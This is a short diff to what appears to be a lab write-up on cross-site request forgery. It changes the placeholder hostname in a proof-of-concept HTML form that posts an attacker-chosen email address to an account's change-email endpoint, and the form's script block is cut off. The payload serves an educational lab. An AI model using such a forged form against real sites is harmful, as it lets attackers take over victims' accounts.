@@ -19,7 +19,7 @@ The lab demonstrates a CSRF vulnerability in an authenticated account email-chan
 ## Proof of Concept
 
 ```html
-<form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
+<form method="POST" action="https://MY-LAB-ID.web-security-academy.net/my-account/change-email">
     <input type="hidden" name="email" value="attacker@example.com">
 </form>
 <script>
